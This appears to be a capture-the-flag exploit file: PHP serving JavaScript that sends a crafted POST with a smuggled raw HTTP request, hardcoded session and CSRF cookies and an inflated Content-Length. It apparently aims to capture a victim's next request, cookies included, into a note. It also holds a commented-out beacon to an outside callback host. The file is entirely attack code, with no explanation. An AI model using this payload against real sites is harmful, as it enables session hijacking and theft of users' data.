<?php
header('Content-Type: application/javascript');
?>
//navigator.sendBeacon('http://host.docker.internal:1200/aaaaa')
fetch('http://localhost/css/notes.css', {
    method: 'POST',
    body: 'POST /notes HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: csrf_token=89e68237a629c23cce92c520748c4c53bc8e198779c50a738b598a48cb5c48fb; PHPSESSID=f9355d7cbde9ee574507dce1b78d955fe3737d0c27383048eebef8ec631b8268\r\nContent-Length: 800\r\nConnection: keep-alive\r\n\r\ncsrf_token=89e68237a629c23cce92c520748c4c53bc8e198779c50a738b598a48cb5c48fb&title=a&content=',
    mode: 'no-cors',
    credentials: 'include'
}).then(()=>{
    window.open('/?y')
    location = "/?x"
})

